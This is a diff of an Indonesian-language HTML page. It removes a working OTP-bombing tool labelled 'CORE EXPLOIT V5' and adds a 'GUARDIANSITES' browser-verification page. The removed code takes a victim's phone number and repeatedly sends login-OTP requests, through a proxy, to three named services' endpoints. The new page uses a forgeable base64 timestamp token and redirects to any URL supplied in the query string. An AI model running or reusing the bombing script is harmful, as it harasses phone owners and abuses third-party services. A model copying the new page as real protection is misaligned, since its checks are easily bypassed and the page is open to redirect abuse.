@@ -3,91 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP PROTOCOL V5</title>
+    <title>GUARDIANSITES - Verification System</title>
     <style>
-        :root { --main: #00FF41; --bg: #0a0a0a; }
-        body { background: var(--bg); color: var(--main); font-family: monospace; display: flex; justify-content: center; padding: 20px; }
-        .terminal { width: 100%; max-width: 400px; border: 2px solid var(--main); padding: 20px; box-shadow: 0 0 10px var(--main); }
-        input { width: 100%; padding: 10px; background: #111; border: 1px solid var(--main); color: var(--main); margin-bottom: 10px; outline: none; }
-        button { width: 100%; padding: 10px; background: var(--main); color: #000; border: none; font-weight: bold; cursor: pointer; margin-bottom: 5px; }
-        button:disabled { background: #333; color: #666; }
-        #log { height: 150px; overflow-y: auto; border-top: 1px solid #333; margin-top: 10px; font-size: 11px; padding-top: 10px; }
-        .green { color: var(--main); }
-        .red { color: #ff3131; }
+        :root {
+            --bg: #ffffff;
+            --accent: #00FF66; /* Hijau Stabilo */
+            --border: 4px solid #000;
+        }
+
+        body {
+            background-color: #f0f0f0;
+            font-family: 'Arial Black', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* Container Neo-Brutalism */
+        .card {
+            background: var(--bg);
+            border: var(--border);
+            box-shadow: 10px 10px 0px #000;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 { font-size: 24px; text-transform: uppercase; margin-bottom: 10px; }
+        p { font-size: 14px; font-family: monospace; color: #555; }
+
+        /* Progress Bar */
+        .progress-box {
+            width: 100%;
+            height: 25px;
+            border: var(--border);
+            background: #eee;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        #bar {
+            width: 0%;
+            height: 100%;
+            background: var(--accent);
+            transition: width 0.2s;
+        }
+
+        /* BinCaptcha Section */
+        #captcha-zone {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            border-top: 3px dashed #000;
+        }
+        .captcha-display {
+            background: #000;
+            color: var(--accent);
+            font-size: 24px;
+            padding: 10px;
+            margin-bottom: 10px;
+            letter-spacing: 5px;
+            font-style: italic;
+            text-decoration: line-through;
+        }
+        input {
+            width: 80%;
+            padding: 10px;
+            border: var(--border);
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        button {
+            background: var(--accent);
+            border: var(--border);
+            padding: 10px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 4px 4px 0 #000;
+        }
+        button:hover { transform: translate(-2px, -2px); box-shadow: 6px 6px 0 #000; }
+
+        .footer { font-size: 10px; margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h3 style="text-align:center">CORE EXPLOIT V5</h3>
-    <hr style="border: 1px solid #333; margin: 10px 0;">
-    <input type="text" id="phone" placeholder="628xxxxxxxxxx">
-    <button id="startBtn" onclick="start()">START SESSION</button>
-    <button id="stopBtn" onclick="stop()" disabled>STOP</button>
-    
-    <div id="log">SYSTEM READY...</div>
+<div class="card">
+    <h1>GUARDIANSITES</h1>
+    <p id="status-msg">Menganalisis keamanan browser...</p>
+
+    <div class="progress-box" id="loader-box">
+        <div id="bar"></div>
+    </div>
+
+    <div id="captcha-zone">
+        <p style="color:red; font-size: 12px;">VERIFIKASI DIPERLUKAN</p>
+        <div class="captcha-display" id="code-box">B1N-XX</div>
+        <input type="text" id="user-input" placeholder="Ketik kode diatas">
+        <br>
+        <button onclick="validateCaptcha()">MASUK KE WEB</button>
+    </div>
+
+    <div class="footer">Dev by @maramadhona | 2026 Protection</div>
 </div>
 
 <script>
-    let isRunning = false;
-    let timer = null;
+    let progress = 0;
+    const bar = document.getElementById('bar');
+    const msg = document.getElementById('status-msg');
+    const captchaZone = document.getElementById('captcha-zone');
+    const loaderBox = document.getElementById('loader-box');
+    
+    let generatedCode = "";
 
-    const apiList = [
-        { name: "DuniaGames", url: "https://duniagames.co.id/api/bazaar/v1/auth/otp", body: (n) => ({ phoneNumber: n, otpType: "login" }) },
-        { name: "Rumah123", url: "https://www.rumah123.com/api/v1/user/otp", body: (n) => ({ phone: n, type: "login" }) },
-        { name: "Cermati", url: "https://www.cermati.com/api/v1/resend_otp", body: (n) => ({ phone: n, type: "login" }) }
-    ];
+    // 1. Jalankan Scanning Otomatis (5 Detik)
+    const scan = setInterval(() => {
+        progress += 2;
+        bar.style.width = progress + "%";
 
-    function writeLog(msg, type) {
-        const log = document.getElementById('log');
-        const color = type === 'success' ? 'green' : (type === 'error' ? 'red' : '');
-        log.innerHTML += `<div class="${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        log.scrollTop = log.scrollHeight;
-    }
+        if (progress === 40) msg.innerText = "Memeriksa IP & User-Agent...";
+        if (progress === 80) msg.innerText = "Validasi One-Time Token...";
 
-    async function fire() {
-        if (!isRunning) return;
-        const num = document.getElementById('phone').value;
-        const api = apiList[Math.floor(Math.random() * apiList.length)];
+        if (progress >= 100) {
+            clearInterval(scan);
+            processAccess();
+        }
+    }, 100);
 
-        writeLog(`ATTEMPTING: ${api.name}...`);
+    function processAccess() {
+        const ua = navigator.userAgent.toLowerCase();
+        // Cek Bot Dasar (Python, Scraper, Headless)
+        const isBot = /bot|python|crawl|headless|selenium|puppeteer/i.test(ua);
 
-        try {
-            // Kita menembak ke proxy internal Vercel (/api/proxy)
-            const res = await fetch('/api/proxy', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    targetUrl: api.url,
-                    body: api.body(num)
-                })
-            });
-
-            const result = await res.json();
-            if (result.success) writeLog(`DELIVERED: ${api.name}`, 'success');
-            else writeLog(`REJECTED: ${api.name}`, 'error');
-
-        } catch (e) {
-            writeLog("CONNECTION ERROR", "error");
+        if (isBot) {
+            showCaptcha();
+        } else {
+            // User asli? Kirim Token otomatis
+            msg.innerText = "Aman! Mengalihkan...";
+            setTimeout(sendToken, 1000);
         }
     }
 
-    function start() {
-        if (document.getElementById('phone').value.length < 10) return alert("Nomor tidak valid!");
-        isRunning = true;
-        document.getElementById('startBtn').disabled = true;
-        document.getElementById('stopBtn').disabled = false;
-        writeLog("SESSION STARTED");
-        fire();
-        timer = setInterval(fire, 20000); // 20 detik agar aman
+    function showCaptcha() {
+        loaderBox.style.display = 'none';
+        captchaZone.style.display = 'block';
+        msg.innerText = "Aktivitas mencurigakan terdeteksi.";
+        
+        // Generate BinCaptcha 6 digit
+        generatedCode = Math.random().toString(36).substring(2, 8).toUpperCase();
+        document.getElementById('code-box').innerText = generatedCode;
     }
 
-    function stop() {
-        isRunning = false;
-        clearInterval(timer);
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('stopBtn').disabled = true;
-        writeLog("SESSION TERMINATED");
+    function validateCaptcha() {
+        const input = document.getElementById('user-input').value.toUpperCase();
+        if (input === generatedCode) {
+            sendToken();
+        } else {
+            alert("Kode salah! Kamu scraper ya?");
+            location.reload();
+        }
+    }
+
+    // 2. Kirim Token Satu Kali Pakai (OTP)
+    function sendToken() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const fromBase64 = urlParams.get('from');
+
+        if (fromBase64) {
+            const targetUrl = atob(fromBase64);
+            const ts = Math.floor(Date.now() / 1000); // Waktu sekarang
+            
+            // Generate Token (Gunakan Key yang sama di Web Utama)
+            const token = btoa("MARA-SECURE-" + ts);
+
+            // Pengalihan Otomatis
+            window.location.href = targetUrl + "?gs_token=" + token + "&ts=" + ts;
+        } else {
+            msg.innerText = "Error: Target URL tidak ditemukan.";
+        }
     }
 </script>
 
